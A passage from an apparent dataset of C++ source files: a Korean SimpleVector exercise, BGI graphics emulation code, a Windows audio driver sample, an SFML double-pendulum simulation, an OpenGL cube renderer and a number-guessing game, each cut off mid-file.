capacity;\n        if (capacity < 1) cout << \"\uc591\uc218\uc758 \uac12\uc744 \uc785\ub825\ud574\uc8fc\uc138\uc694.\" << endl;\n    }\n    SimpleVector<int> vec(capacity);    // \ud06c\uae30\uac00 capacity\uc778 \ubc30\uc5f4\uc744 \uc0dd\uc131\n    int input;                          // \uc790\ub8cc\ud615\uc744 \ubc14\uafc0 \ub54c\ub294 \uc774\uac83\uacfc \uc717\uc904\uc758 \uc790\ub8cc\ud615\uc744 \ubcc0\uacbd\ud55c\ub2e4\n  \n\n    cout << \"\ud06c\uae30\uac00 \" << capacity << \"\uc778 \ubc30\uc5f4\uc774 \uc0dd\uc131\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl << endl;\n\n    for (char i = 'a'; i != 'x';) {                     // \ubc18\ubcf5\ubb38\uc744 \ud1b5\ud574 \uc791\uc5c5, x\uc785\ub825\uc2dc \ud0c8\ucd9c\n        cout << \"\uc5b4\ub5a4 \uc791\uc5c5\uc744 \ud558\uc2dc\uaca0\uc2b5\ub2c8\uae4c? (1 : push_back / 2 : pop_back / 3 : sort / x : \uc791\uc5c5\uc885\ub8cc)\" << endl;\n        cin >> i;                                       // \uc120\ud0dd\uc9c0 \uc785\ub825\n        switch (i) {\n        case '1':\n            cout << \"\ubc30\uc5f4\uc5d0 \uc785\ub825\ud560 \uc218\ub97c \uc801\uc5b4\uc8fc\uc138\uc694.\" << endl;\n            cin >> input;\n            vec.push_back(input);   // push_back() \uba54\uc11c\ub4dc \ud638\ucd9c\n            break;\n        case '2':\n            vec.pop_back();         // pop_back() \uba54\uc11c\ub4dc \ud638\ucd9c\n            break;\n        case '3':\n            vec.sortData();         // sortData() \uba54\uc11c\ub4dc \ud638\ucd9c\n            break;\n        case 'x':                   // \ubc18\ubcf5\ubb38 \uc885\ub8cc\n            break;\n        }\n    }\n    cout << \"\ub9cc\ub4e4\uc5b4\uc9c4 \ubc30\uc5f4\uc758 \ud06c\uae30\ub294 :\" << vec.capacity() << endl << \"\ubc30\uc5f4\uc548\uc758 \uc6d0\uc18c\uc758 \uac1c\uc218\ub294 :\" << vec.size() << endl;\n    cout << \"\ub9cc\ub4e4\uc5b4\uc9c4 \ubc30\uc5f4\uc740 { \";\n    for (int i = 0; i < vec.size(); i++) {    // \uc785\ub825\ub41c \uc6d0\uc18c\uc758 \uac1c\uc218\ub9cc\ud07c \ubc18\ubcf5\n        cout << vec.getData(i) << \" \";        // \uc800\uc7a5\ub41c \ubc30\uc5f4\uc744 \ucd9c\ub825\n    }\n    cout << \"} \uc785\ub2c8\ub2e4.\" << endl << endl;\n\n    SimpleVector<int> vec2 = vec;              // \ubcf5\uc0ac \uc0dd\uc131\uc790\ub97c \uc0ac\uc6a9\n    cout << \"\ubcf5\uc0ac\ub41c \ubc30\uc5f4\uc758 \ud06c\uae30\ub294 :\" << vec2.capacity() << endl << \"\ubc30\uc5f4\uc548\uc758 \uc6d0\uc18c\uc758 \uac1c\uc218\ub294 :\" << vec2.size() << endl;\n    cout << \"\ubcf5\uc0ac\ub41c \ubc30\uc5f4\uc740 { \";\n    for (int i = 0; i < vec2.size(); i++) {    // \ubcf5\uc0ac\ub41c \uc6d0\uc18c\uc758 \uac1c\uc218\ub9cc\ud07c \ubc18\ubcf5\n        cout << vec2.getData(i) << \" \";        // \ubcf5\uc0ac\ub41c \ubc30\uc5f4\uc744 \ucd9c\ub825\n    }\n    cout << \"} \uc785\ub2c8\ub2e4.\";\n\n    return 0;\n}\n\n\n\n//int main() {                // void* \ud3ec\uc778\ud2b8\ub97c \uc0ac\uc6a9\ud558\uc5ec \ub9cc\ub4e4\uc5c8\uc73c\ub098 \ubcf5\uc0ac \uc0dd\uc131\uc790\uac00 \uc791\ub3d9\ub418\uc9c0 \uc54a\uc544\uc11c \uc804\uccb4 \uc8fc\uc11d\ucc98\ub9ac\n//    int capacity = 0;       // \uc785\ub825\ubc1b\uc744 \ubc30\uc5f4\uc758 \ud06c\uae30\n//    while (capacity < 1) {\n//        cout << \"\ub9cc\ub4e4\uace0\uc790\ud558\ub294 \ubc30\uc5f4\uc758 \ud06c\uae30\ub97c \uc785\ub825\ud574 \uc8fc\uc138\uc694.\" << ",
    "//\n// winbgi.cpp  -- One of the files required to run BGI graphics programs\n//\n// You don't need to edit this file, or print it out.\n\n#include <windows.h>\n#include <stddef.h>\n#include <stdio.h>\n#include <math.h>\n#include \"graphics2.h\"\n\n#define MAX_PAGES 16\n\nstatic HDC hdc[4];\n\nstatic HPEN hPen;\nstatic HRGN hRgn;\nstatic HFONT hFont;\nstatic NPLOGPALETTE pPalette;\nstatic PAINTSTRUCT ps;\nstatic HWND hWnd;\nstatic HBRUSH hBrush[USER_FILL+1];\nstatic HBRUSH hBackgroundBrush;\n\nstatic HPALETTE hPalette;\nstatic HBITMAP hBitmap[MAX_PAGES];\nstatic HBITMAP hPutimageBitmap;\n\nstatic int timeout_expired;\n\n#define PEN_CACHE_SIZE   8\n#define FONT_CACHE_SIZE  8 \n#define BG               64\n#define TIMER_ID         1\n\n//\n// When XOR or NOT write modes are used for drawing high BG bit is cleared, so\n// drawing colors should be adjusted to preserve this bit\n// \n#define ADJUSTED_MODE(mode) ((mode) == XOR_PUT || (mode) == NOT_PUT)\n\nint bgiemu_handle_redraw = TRUE;\nint bgiemu_default_mode = VGAHI; //VGAMAX;\n\nstatic int screen_width;\nstatic int screen_height;\nstatic int window_width;\nstatic int window_height;\n\n//Mouse info    (Added 1-Oct-2000, Matthew Weathers)\nstatic bool bMouseUp = false;\nstatic bool bMouseDown = false;\nstatic int iCurrentMouseX = 0;\nstatic int iCurrentMouseY = 0;\nstatic int iClickedMouseX = 0;\nstatic int iClickedMouseY = 0;\nstatic int iWhichMouseButton = LEFT_BUTTON;\n\nstatic int line_style_cnv[] = {\n    PS_SOLID, PS_DOT, PS_DASHDOT, PS_DASH, \n    PS_DASHDOTDOT /* if user style lines are not supported */\n}; \nstatic int write_mode_cnv[] = \n  {R2_COPYPEN, R2_XORPEN, R2_MERGEPEN, R2_MASKPEN, R2_NOTCOPYPEN};\nstatic int bitblt_mode_cnv[] = \n  {SRCCOPY, SRCINVERT, SRCPAINT, SRCAND, NOTSRCCOPY};\n\nstatic int font_weight[] = \n{ \n    FW_BOLD,    // DefaultFont\n    FW_NORMAL,  // TriplexFont\n    FW_NORMAL,  // SmallFont\n    FW_NORMAL,  // SansSerifFont\n    FW_NORMAL,  // GothicFont\n    FW_NORMAL,  // ScriptFont\n    FW_NORMAL,  // SimplexFont\n    FW_NORMAL,  // TriplexScriptFont\n    FW_NORMAL,  // ComplexFont\n    FW_NORMAL,  // EuropeanFont\n    FW_BOLD     // BoldFont\n};\n\nstatic int font_family[] = \n{\n    FIXED_PITCH|FF_DONTCARE,     // DefaultFont\n    VARIABLE_PITCH|FF_ROMAN,     // TriplexFont\n    VARIABLE_PITCH|FF_MODERN,    // SmallFont\n    VARIABLE_PITCH|FF_DONTCARE,  // SansSerifFont\n    VARIABLE_PITCH|FF_SWISS,     // GothicFont\n    VARIABLE_PITCH|FF_SCRIPT,    // ScriptFont\n    VARIABLE_PITCH|FF_DONTCARE,  // SimplexFont\n    VARIABLE_PITCH|FF_SCRIPT,    // TriplexScriptFont\n    VARIABLE_PITCH|FF_DONTCARE,  // ComplexFont\n    VARIABLE_PITCH|FF_DONTCARE,  // EuropeanFont\n    VARIABLE_PITCH|FF_DONTCARE   // BoldFont\n  };\n\nstatic const char* font_name[] = \n{\n    \"Console\",          // DefaultFont\n    \"Times New Roman\",  // TriplexFont\n    \"Small Fonts\",      // SmallFont\n    \"MS Sans Serif\",    // SansSerifFont\n    \"Arial\",            // GothicFont\n    \"Script\",           // ScriptFont\n    \"Times New Roman\",  // SimplexFont\n    \"Script\",           // TriplexScriptFont\n    \"Courier New\",      // ComplexFont\n    \"Times New Roman\",  // EuropeanFont\n    \"Courier New Bold\", // BoldFont\n};\n\nstatic int text_halign_cnv[] = {TA_LEFT, TA_CENTER, TA_RIGHT};  \nstatic int text_valign_cnv[] = {TA_BOTTOM, TA_BASELINE, TA_TOP};\n\nstatic palettetype current_palette;\n\nstatic struct { int width; int height; } font_metrics[][11] = { \n{{0,0},{8,8},{16,16},{24,24},{32,32},{40,40},{48,48},{56,56},{64,64},{72,72},{80,80}}, // DefaultFont\n{{0,0},{13,18},{14,20},{16,23},{22,31},{29,41},{36,51},{44,62},{55,77},{66,93},{88,124}}, // TriplexFont\n{{0,0},{3,5},{4,6},{4,6},{6,9},{8,12},{10,15},{12,18},{15,22},{18,27},{24,36}}, // SmallFont\n{{0,0},{11,19},{12,21},{14,24},{19,32},{25,42},{31,53},{38,64},{47,80},{57,96},{76,128}}, // SansSerifFont \n{{0,0},{13,19},{14,21},{16,24},{22,32},{29,42},{36,53},{44,64},{55,80},{66,96},{88,128}}, // GothicFont\n// I am not sure about metrics of following fonts\n{{0,0},{11,19},{12,21},{14,24},{19,32},{25,42},{31,53},{38,64},{47,80},{57,96},{76,128}}, // ScriptFont\n{{0,0},{11,19},{12,21},{14,24},{19,32},{25,42},{31,53},{38,64},{47,80},{57,96},{76,128}}, // SimplexFont\n{{0,0},{13,18},{14,20},{16,23},{22,31},{29,41},{36,51},{44,62},{55,77},{66,93},{88,124}}, // TriplexScriptFont\n{{0,0},{11,19},{12,21},{14,24},{19,32},{25,42},{31,53},{38,64},{47,80},{57,96},{76,128}}, // ComplexFont\n{{0,0},{11,19},{12,21},{14,24},{19,32},{25,42},{31,53},{38,64},{47,80},{57,96},{76,128}}, // EuropeanFont\n{{0,0},{11,19},{12,21},{14,24},{19,32},{25,42},{31,53},{38,64},{47,80},{57,96},{76,128}} // BoldFont\n}; \n\nstruct BGIimage { \n    short width;\n    short height;\n    int   reserved; // let bits be aligned to DWORD boundary\n    char  bits[1];\n};\n\nstruct BGIbitmapinfo { \n    BITMAPINFOHEADER hdr;\n    short            color_table[64];\n};\n    \nstatic BGIbitmapinfo bminfo = {\n    {sizeof(BITMAPINFOHEADER), 0, 0, 1, 4, BI_RGB}\n};\n\nstatic int* image_bits; \n\nstatic int normal_font_size[] = { 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4};\n\nstatic linesettingstype l",
    "/*++\n\nCopyright (c) Microsoft Corporation All Rights Reserved\n\nModule Name:\n\n    speakertopo.cpp\n\nAbstract:\n\n    Implementation of topology miniport for the speaker (internal).\n--*/\n\n#pragma warning (disable : 4127)\n\n#include \"definitions.h\"\n#include \"endpoints.h\"\n#include \"mintopo.h\"\n#include \"speakertopo.h\"\n#include \"speakertoptable.h\"\n\n\n#pragma code_seg(\"PAGE\")\n//=============================================================================\nNTSTATUS\nPropertyHandler_SpeakerTopoFilter\n( \n    _In_ PPCPROPERTY_REQUEST      PropertyRequest \n)\n/*++\n\nRoutine Description:\n\n  Redirects property request to miniport object\n\nArguments:\n\n  PropertyRequest - \n\nReturn Value:\n\n  NT status code.\n\n--*/\n{\n    PAGED_CODE();\n\n    ASSERT(PropertyRequest);\n\n    DPF_ENTER((\"[PropertyHandler_SpeakerTopoFilter]\"));\n\n    // PropertryRequest structure is filled by portcls. \n    // MajorTarget is a pointer to miniport object for miniports.\n    //\n    NTSTATUS            ntStatus = STATUS_INVALID_DEVICE_REQUEST;\n    PCMiniportTopology  pMiniport = (PCMiniportTopology)PropertyRequest->MajorTarget;\n\n    if (IsEqualGUIDAligned(*PropertyRequest->PropertyItem->Set, KSPROPSETID_Jack))\n    {\n        if (PropertyRequest->PropertyItem->Id == KSPROPERTY_JACK_DESCRIPTION)\n        {\n            ntStatus = pMiniport->PropertyHandlerJackDescription(\n                PropertyRequest,\n                ARRAYSIZE(SpeakerJackDescriptions),\n                SpeakerJackDescriptions\n                );\n        }\n        else if (PropertyRequest->PropertyItem->Id == KSPROPERTY_JACK_DESCRIPTION2)\n        {\n            ntStatus = pMiniport->PropertyHandlerJackDescription2(\n                PropertyRequest,\n                ARRAYSIZE(SpeakerJackDescriptions),\n                SpeakerJackDescriptions,\n                0 // jack capabilities\n                );\n        }\n    }\n\n    return ntStatus;\n} // PropertyHandler_SpeakerTopoFilter\n\n//=============================================================================\nNTSTATUS\nPropertyHandler_SpeakerTopology\n(\n    _In_ PPCPROPERTY_REQUEST      PropertyRequest\n)\n/*++\n\nRoutine Description:\n\n  Redirects property request to miniport object\n\nArguments:\n\n  PropertyRequest -\n\nReturn Value:\n\n  NT status code.\n\n--*/\n{\n    PAGED_CODE();\n\n    ASSERT(PropertyRequest);\n\n    DPF_ENTER((\"[PropertyHandler_SpeakerTopology]\"));\n\n    // PropertryRequest structure is filled by portcls. \n    // MajorTarget is a pointer to miniport object for miniports.\n    //\n    PCMiniportTopology pMiniport = (PCMiniportTopology)PropertyRequest->MajorTarget;\n\n    return pMiniport->PropertyHandlerGeneric(PropertyRequest);\n} // PropertyHandler_SpeakerTopology\n\n#pragma code_seg()\n",
    "#include <SFML/Graphics.hpp>\n\nclass pendulum {\nprivate:\n\n    double strength;\n    double mass1;\n    double mass2;\n    double accel1{ 0 };\n    double accel2{ 0 };\n    double vel1{ 0 };\n    double vel2{ 0 };\n    double pos1;\n    double pos2;\n    sf::Vector2f posXY1;\n    sf::Vector2f posXY2;\n    double length1;\n    double length2;\n    double normalize;\n    sf::Vector2f origin;\n\n    sf::CircleShape m1;\n    sf::CircleShape m2;\n    sf::CircleShape originm;\n    sf::Vertex line1[2];\n    sf::Vertex line2[2];\n    sf::Vector2f center;\n\npublic:\n    pendulum(double str, double posf, double poss, double len1, double len2, float ori1, float ori2)\n        : strength(str), pos1(posf), pos2(poss), length1(len1), length2(len2) {\n        origin = { ori1, ori2 };\n        mass1 = 10;\n        mass2 = 10;\n        normalize = 2 * mass1 + mass2 - mass2 * cos(2 * pos1 - 2 * pos2);\n        center = { 20, 20 };\n\n        update();\n\n        m1.setPosition(posXY1);\n        m1.setFillColor(sf::Color::Black);\n        m1.setRadius(20);\n\n        m2.setPosition(posXY2);\n        m2.setFillColor(sf::Color::Black);\n        m2.setRadius(20);\n\n        originm.setPosition(sf::Vector2f{ ori1, ori2 });\n        originm.setFillColor(sf::Color::White);\n        originm.setRadius(1);\n\n        line1[0].position = origin;\n        line1[0].color = sf::Color::Black;\n        line1[1].position = posXY1 + center;\n        line1[1].color = sf::Color::Black;\n\n        line2[0].position = posXY1 + center;\n        line2[0].color = sf::Color::Black;\n        line2[1].position = posXY2 + center;\n        line2[1].color = sf::Color::Black;\n    }\n\n\n    double accel1Cal() {\n        double num1 = -strength * (2 * mass1 + mass2) * sin(pos1);\n        double num2 = -mass2 * strength * sin(pos1 - 2 * pos2);\n        double num3 = -2 * sin(pos1 - pos2) * mass2 * (vel2 * vel2 * length2 + vel1 * vel1 * length1 * cos(pos1 - pos2));\n        double acc = (num1 + num2 + num3) / (length1 * normalize);\n        return acc;\n    }\n\n    double accel2Cal() {\n        double num1 = 2 * sin(pos1 - pos2);\n        double num2 = (vel1 * vel1 * length1 * (mass1 + mass2));\n        double num3 = strength * (mass1 + mass2) * cos(pos1);\n        double num4 = vel2 * vel2 * length2 * mass2 * cos(pos1 - pos2);\n        double acc = (num1 * (num2 + num3 + num4)) / (length2 * normalize);\n        return acc;\n    }\n\n    void updateRK4() {\n        double dt = 0.5;\n\n        double k1_pos1, k2_pos1, k3_pos1, k4_pos1;\n        double k1_pos2, k2_pos2, k3_pos2, k4_pos2;\n        double k1_vel1, k2_vel1, k3_vel1, k4_vel1;\n        double k1_vel2, k2_vel2, k3_vel2, k4_vel2;\n\n        k1_vel1 = accel1Cal();\n        k1_vel2 = accel2Cal();\n        k1_pos1 = vel1;\n        k1_pos2 = vel2;\n\n        vel1 += 0.5 * dt * k1_vel1;\n        vel2 += 0.5 * dt * k1_vel2;\n        pos1 += 0.5 * dt * k1_pos1;\n        pos2 += 0.5 * dt * k1_pos2;\n\n        k2_vel1 = accel1Cal();\n        k2_vel2 = accel2Cal();\n        k2_pos1 = vel1;\n        k2_pos2 = vel2;\n\n        vel1 += 0.5 * dt * k2_vel1 - 0.5 * dt * k1_vel1;\n        vel2 += 0.5 * dt * k2_vel2 - 0.5 * dt * k1_vel2;\n        pos1 += 0.5 * dt * k2_pos1 - 0.5 * dt * k1_pos1;\n        pos2 += 0.5 * dt * k2_pos2 - 0.5 * dt * k1_pos2;\n\n        k3_vel1 = accel1Cal();\n        k3_vel2 = accel2Cal();\n        k3_pos1 = vel1;\n        k3_pos2 = vel2;\n\n        vel1 += dt * k3_vel1 - 0.5 * dt * k2_vel1;\n        vel2 += dt * k3_vel2 - 0.5 * dt * k2_vel2;\n        pos1 += dt * k3_pos1 - 0.5 * dt * k2_pos1;\n        pos2 += dt * k3_pos2 - 0.5 * dt * k2_pos2;\n\n        k4_vel1 = accel1Cal();\n        k4_vel2 = accel2Cal();\n        k4_pos1 = vel1;\n        k4_pos2 = vel2;\n\n        vel1 += dt / 6.0 * (k1_vel1 + 2 * k2_vel1 + 2 * k3_vel1 + k4_vel1);\n        vel2 += dt / 6.0 * (k1_vel2 + 2 * k2_vel2 + 2 * k3_vel2 + k4_vel2);\n        pos1 += dt / 6.0 * (k1_pos1 + 2 * k2_pos1 + 2 * k3_pos1 + k4_pos1);\n        pos2 += dt / 6.0 * (k1_pos2 + 2 * k2_pos2 + 2 * k3_pos2 + k4_pos2);\n\n    }\n\n\n    void update() {\n        posXY1.x = origin.x + length1 * sin(pos1);\n        posXY1.y = origin.y + length1 * cos(pos1);\n        posXY2.x = origin.x + length1 * sin(pos1) + length2 * sin(pos2);\n        posXY2.y = origin.y + length1 * cos(pos1) + length2 * cos(pos2);\n    }\n\n    void render(sf::RenderWindow& wind) {\n        m1.setPosition(posXY1);\n        m2.setPosition(posXY2);\n\n        line1[0].position = origin;\n        line1[1].position = posXY1 + center;\n\n        line2[0].position = posXY1 + center;\n        line2[1].position = posXY2 + center;\n\n        wind.draw(line1, 2, sf::Lines);\n        wind.draw(line2, 2, sf::Lines);\n        wind.draw(m1);\n        wind.draw(m2);\n        wind.draw(originm);\n\n\n    }\n};\n\n\n\nint main()\n{\n    sf::RenderWindow window(sf::VideoMode(1600, 1000), \"quackudy\");\n    window.setFramerateLimit(60);\n\n    pendulum pendulum(0.5, 0.8, 1, 200, 150, 800, 500);\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                w",
    "#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <cmath>\n\nstd::string readFile(const std::string& filepath) {\nstd::ifstream file(filepath);\nif (!file.is_open()) {\nstd::cerr << \"Failed to open file: \" << filepath << \"\\n\";\nexit(EXIT_FAILURE);\n}\nstd::stringstream buffer;\nbuffer << file.rdbuf();\nreturn buffer.str();\n}\n\nGLuint createShaderProgram(const std::string& vertexFile, const std::string& fragmentFile) {\nstd::string vertexSource = readFile(vertexFile);\nstd::string fragmentSource = readFile(fragmentFile);\nGLuint vertexShader = glCreateShader(GL_VERTEX_SHADER);\nconst char* vertexSourceCStr = vertexSource.c_str();\nglShaderSource(vertexShader, 1, &vertexSourceCStr, nullptr);\nglCompileShader(vertexShader);\nGLint success;\nglGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);\nif (!success) {\nchar infoLog[512];\nglGetShaderInfoLog(vertexShader, 512, nullptr, infoLog);\nstd::cerr << \"ERROR: Vertex shader compilation failed\\n\" << infoLog << \"\\n\";\n}\nGLuint fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\nconst char* fragmentSourceCStr = fragmentSource.c_str();\nglShaderSource(fragmentShader, 1, &fragmentSourceCStr, nullptr);\nglCompileShader(fragmentShader);\nglGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);\nif (!success) {\nchar infoLog[512];\nglGetShaderInfoLog(fragmentShader, 512, nullptr, infoLog);\nstd::cerr << \"ERROR: Fragment shader compilation failed\\n\" << infoLog << \"\\n\";\n}\nGLuint shaderProgram = glCreateProgram();\nglAttachShader(shaderProgram, vertexShader);\nglAttachShader(shaderProgram, fragmentShader);\nglLinkProgram(shaderProgram);\nglGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);\nif (!success) {\nchar infoLog[512];\nglGetProgramInfoLog(shaderProgram, 512, nullptr, infoLog);\nstd::cerr << \"ERROR: Shader program linking failed\\n\" << infoLog << \"\\n\";\n}\nglDeleteShader(vertexShader);\nglDeleteShader(fragmentShader);\nreturn shaderProgram;\n}\n\nvoid generateCube(GLfloat* vertices, GLuint* indices) {\nvertices[0] = -0.5f; vertices[1] = -0.5f; vertices[2] = -0.5f; vertices[3] = 1.0f; vertices[4] = 0.0f; vertices[5] = 0.0f;\nvertices[6] = 0.5f; vertices[7] = -0.5f; vertices[8] = -0.5f; vertices[9] = 0.0f; vertices[10] = 1.0f; vertices[11] = 0.0f;\nvertices[12] = 0.5f; vertices[13] = 0.5f; vertices[14] = -0.5f; vertices[15] = 0.0f; vertices[16] = 0.0f; vertices[17] = 1.0f;\nvertices[18] = -0.5f; vertices[19] = 0.5f; vertices[20] = -0.5f; vertices[21] = 1.0f; vertices[22] = 1.0f; vertices[23] = 0.0f;\nvertices[24] = -0.5f; vertices[25] = -0.5f; vertices[26] = 0.5f; vertices[27] = 1.0f; vertices[28] = 0.0f; vertices[29] = 1.0f;\nvertices[30] = 0.5f; vertices[31] = -0.5f; vertices[32] = 0.5f; vertices[33] = 0.0f; vertices[34] = 1.0f; vertices[35] = 1.0f;\nvertices[36] = 0.5f; vertices[37] = 0.5f; vertices[38] = 0.5f; vertices[39] = 0.0f; vertices[40] = 0.0f; vertices[41] = 1.0f;\nvertices[42] = -0.5f; vertices[43] = 0.5f; vertices[44] = 0.5f; vertices[45] = 1.0f; vertices[46] = 1.0f; vertices[47] = 1.0f;\n\nindices[0] = 0; indices[1] = 1; indices[2] = 2;\nindices[3] = 0; indices[4] = 2; indices[5] = 3;\nindices[6] = 4; indices[7] = 5; indices[8] = 6;\nindices[9] = 4; indices[10] = 6; indices[11] = 7;\nindices[12] = 0; indices[13] = 1; indices[14] = 5;\nindices[15] = 0; indices[16] = 5; indices[17] = 4;\nindices[18] = 1; indices[19] = 2; indices[20] = 6;\nindices[21] = 1; indices[22] = 6; indices[23] = 5;\nindices[24] = 2; indices[25] = 3; indices[26] = 7;\nindices[27] = 2; indices[28] = 7; indices[29] = 6;\nindices[30] = 3; indices[31] = 0; indices[32] = 4;\nindices[33] = 3; indices[34] = 4; indices[35] = 7;\n}\n\nvoid renderCube(GLuint shaderProgram, GLfloat* vertices, GLuint* indices, float rotation) {\nGLuint VAO, VBO, EBO;\nglGenVertexArrays(1, &VAO);\nglGenBuffers(1, &VBO);\nglGenBuffers(1, &EBO);\nglBindVertexArray(VAO);\nglBindBuffer(GL_ARRAY_BUFFER, VBO);\nglBufferData(GL_ARRAY_BUFFER, 48 * sizeof(GLfloat), vertices, GL_STATIC_DRAW);\nglBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\nglBufferData(GL_ELEMENT_ARRAY_BUFFER, 36 * sizeof(GLuint), indices, GL_STATIC_DRAW);\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(GLfloat), (GLvoid*)0);\nglEnableVertexAttribArray(0);\nglVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(GLfloat), (GLvoid*)(3 * sizeof(GLfloat)));\nglEnableVertexAttribArray(1);\nglBindBuffer(GL_ARRAY_BUFFER, 0);\nglBindVertexArray(0);\n\nGLuint modelLoc = glGetUniformLocation(shaderProgram, \"model\");\nGLuint viewLoc = glGetUniformLocation(shaderProgram, \"view\");\nGLuint projLoc = glGetUniformLocation(shaderProgram, \"projection\");\n\nglm::mat4 view = glm::translate(glm::mat4(1.0f), glm::vec3(0.0f, 0.0f, -3.0f));\nglm::mat4 projection = glm::perspective(glm::radians(45.0f), 800.0f / 600.0f, 0.1f, 100.0f);\nglm::mat4 model = glm::rotate(glm::mat4(1.0f), glm::radians(rotation), glm::vec3(1.0f, 2.0f, -3.0f));\n\nglUniformMatrix4fv(viewLoc, 1, GL_FALSE",
    "#include <iostream>\n\nusing namespace std;\n\nstruct numar{\n   int freq;\n   int probability;\n   int id;\n}a[11], b[11], c[11], d[11];\n\nint nr[5] = {-1, -1, -1, -1, -1}, x[4], aux[5], maxcnt, id_zero = -1, cnt_copy, nr1, nr2, nr3, nr4, total, number_zero, index, number_of_guesses;\nunsigned numbers1[10] = {7, 3, 5, 9, 0, 1, 4, 2, 8, 6};\nunsigned numbers2[10] = {0, 1, 4, 2, 7, 3, 5, 9, 8, 6};\nunsigned numbers3[10] = {4, 2, 8, 6, 7, 3, 5, 9, 0, 1};\nunsigned numbers4[10] = {5, 9, 0, 8, 6, 1, 7, 3, 4, 2};\n\n/*int change2(int i, int j)\n{\n    int k = 1, cnt = 0;\n    for(int i = 0; i <= 9; i++)\n            if(freq[i][numbers[i]] != 1)\n            {\n                freq[i][numbers[i]] = 1;\n                aux[i] = numbers[i];\n                break;\n            }\n    for(int i = 0; i <= 9; i++)\n            if(freq[j][numbers[i]] != 1)\n            {\n                freq[j][numbers[i]] = 1;\n                aux[j] = numbers[i];\n                break;\n            }\n    while(k <= 4)\n        if(x[k++] == aux[k])\n            cnt++;\n    if(cnt == 2)\n        return 2;\n}*/\n\nint main()\n{\n    bool ok = 1;\n    int found;\n    int cnt, k, input_number, cnt_probability = 0;\n    cout << \"please enter the number to be guessed: \";\n    cin >> input_number;\n    k = 4;\n    while(input_number)\n    {\n        x[k--] = input_number % 10;\n        input_number /= 10;\n    }\n    for(int i = 0; i <= 10; i++)\n    {\n        a[i].freq = a[i].id = -1;\n        b[i].freq = b[i].id = -1;\n        c[i].freq = c[i].id = -1;\n        d[i].freq = d[i].id = -1;\n    }\n    do\n    {\n        if(total == 4)\n        {\n            ok = 0;\n            cout << \"\\nnumber guessed\\n\";\n            cout << \"number is: \" << nr[1] << nr[2] << nr[3] << nr[4]; //0724\n            cout << \"\\nnumber of guesses: \" << number_of_guesses;\n            break;\n        }\n        cout << \"new guess: \";\n        cnt = 0;\n        if(nr[1] == -1)\n        {\n            for(int i = 0; i <= 10; i++)\n                if(a[numbers1[i]].freq != 1)\n                {\n                    a[numbers1[i]].freq = 1;\n                    aux[1] = numbers1[i];\n                    break;\n                }\n            cout << aux[1];\n        }\n        else cout << nr[1];\n\n        if(nr[2] == -1)\n        {\n            for(int i = 0; i <= 10; i++)\n                if(b[numbers2[i]].freq != 1)\n                {\n                    b[numbers2[i]].freq = 1;\n                    aux[2] = numbers2[i];\n                    break;\n                }\n            cout << aux[2];\n        }\n        else cout << nr[2];\n\n        if(nr[3] == -1)\n        {\n            for(int i = 0; i <= 10; i++)\n                if(c[numbers3[i]].freq != 1)\n                {\n                    c[numbers3[i]].freq = 1;\n                    aux[3] = numbers3[i];\n                    break;\n                }\n            cout << aux[3];\n        }\n        else cout << nr[3];\n\n        if(nr[4] == -1)\n        {\n            for(int i = 0; i <= 10; i++)\n                if(d[numbers4[i]].freq != 1)\n                {\n                    d[numbers4[i]].freq = 1;\n                    aux[4] = numbers4[i];\n                    break;\n                }\n            cout << aux[4];\n        }\n        else cout << nr[4];\n        number_of_guesses++;\n        k = 1;\n        while(k <= 4)\n        {\n            if(x[k] == aux[k] && aux[k] != nr[k])\n                cnt++;\n            //cout << \"x\" << x[k] << ' ' << aux[k] << '\\n';\n            k++;\n        }\n        //cout << \"\\n cnt= \" << cnt;\n        if(total + cnt == 4 && cnt == 1)\n        {\n            ok = 0;\n            cout << \"\\nnumber guessed\\n\";\n            cout << \"number is: \"; //0724\n            if(nr[1] != -1)\n                cout << nr[1];\n            else\n                cout << aux[1];\n            if(nr[2] != -1)\n                cout << nr[2];\n            else\n                cout << aux[2];\n            if(nr[3] != -1)\n                cout << nr[3];\n            else\n                cout << aux[3];\n            if(nr[4] != -1)\n                cout << nr[4];\n            else\n                cout << aux[4];\n            cout << \"\\nnumber of guesses: \" << number_of_guesses;\n            break;\n        }\n\n        if(maxcnt < cnt)\n            maxcnt = cnt;\n        if(cnt == 0)\n        {\n            a[aux[1]].id = b[aux[2]].id = c[aux[3]].id = d[aux[4]].id = 0;\n            a[aux[1]].probability = b[aux[2]].probability = c[aux[3]].probability = d[aux[4]].probability = 0;\n            id_zero++;\n            number_zero = aux[1];\n            //add + if prec cnt != 0 exists\n            index++;\n            //while(cnt_probability > 0)\n\n                for(int i = 0; i <= 10; i++)\n                {\n                    if(a[i].id == 1)\n                    {\n                                nr1 = i;\n                                a[i].id = 2;\n                               /* nr2 = numbers2[i];\n                                nr3 = numbers3[i];\n                                nr4 = numbers4[i];*/\n                                if(nr",
